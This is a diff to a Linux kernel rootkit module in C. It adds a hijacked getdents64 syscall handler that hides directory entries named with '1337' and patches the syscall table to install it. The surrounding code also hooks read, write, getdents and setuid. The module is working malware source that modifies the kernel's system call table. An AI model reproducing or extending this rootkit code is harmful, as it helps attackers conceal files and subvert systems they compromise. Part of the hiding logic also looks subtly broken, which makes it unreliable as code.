@@ -16,6 +16,7 @@
 #include <linux/file.h>
 //processes directory
 #include <linux/proc_fs.h>
+#include <linux/types.h>
 
 
 struct linux_dirent {
@@ -36,7 +37,7 @@ unsigned long * sys_call_table;
 asmlinkage int (*real_setuid) (uid_t uid);
 asmlinkage int (*real_setuid32) (uid_t uid);
 asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
-
+asmlinkage int (*real_getdents64) (unsigned int, struct linux_dirent64*, unsigned int);
 asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
 asmlinkage long (*real_write)(unsigned int, char __user *, size_t);
 
@@ -268,6 +269,34 @@ out:
 	return num_reads;
 }
 
+asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+
+	int num_reads = real_getdents64(fd, dirp, count);
+
+	struct linux_dirent64 *cdirp = dirp, *pdirp = NULL;
+
+	int i;
+	long start_offset = (long)dirp;
+	
+	printk(KERN_INFO "hijacked call.\n");
+	printk(KERN_INFO "num reads: %d\n",num_reads);
+
+	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
+		cdirp = (struct linux_dirent64*)(start_offset + i);
+		
+		if (strstr(cdirp->d_name,"1337") != NULL){
+			if (pdirp == NULL)
+				dirp = (struct linux_dirent64 *)(start_offset + (long)(cdirp->d_reclen));
+			else
+				pdirp->d_reclen += cdirp->d_reclen;
+		} else {
+			pdirp = cdirp;
+		}
+	}
+
+	return num_reads;
+}
+
 
 
 /* make the address writable if it is write-protected.*/
@@ -290,16 +319,18 @@ int make_ro(unsigned long address){
 
 void hijack_sys_call_table(void){
 	make_rw((unsigned long)sys_call_table);
-        real_getdents = (void*)*(sys_call_table + __NR_getdents);
-        real_setuid = (void*)*(sys_call_table + __NR_setuid);
-        real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
+    real_getdents = (void*)*(sys_call_table + __NR_getdents);
+    real_getdents64 = (void*)*(sys_call_table + __NR_getdents64);
+    real_setuid = (void*)*(sys_call_table + __NR_setuid);
+    real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
 	real_read = (void*)*(sys_call_table + __NR_read);
 	real_write = (void*)*(sys_call_table + __NR_write);
 	*(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
-        *(sys_call_table + __NR_write) = (unsigned long)hijacked_write;
+    *(sys_call_table + __NR_write) = (unsigned long)hijacked_write;
 	*(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
-        *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
-        *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
+	*(sys_call_table + __NR_getdents64) = (unsigned long)hijacked_getdents64;
+    *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
+    *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
 	make_ro((unsigned long)sys_call_table);
 }
 
@@ -330,6 +361,7 @@ int init_module(void){
 void cleanup_module(void){
       	make_rw((unsigned long)sys_call_table);
 	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
+	*(sys_call_table + __NR_getdents64) = (unsigned long)real_getdents64;
         *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
         *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
 	*(sys_call_table + __NR_read) = (unsigned long)real_read;
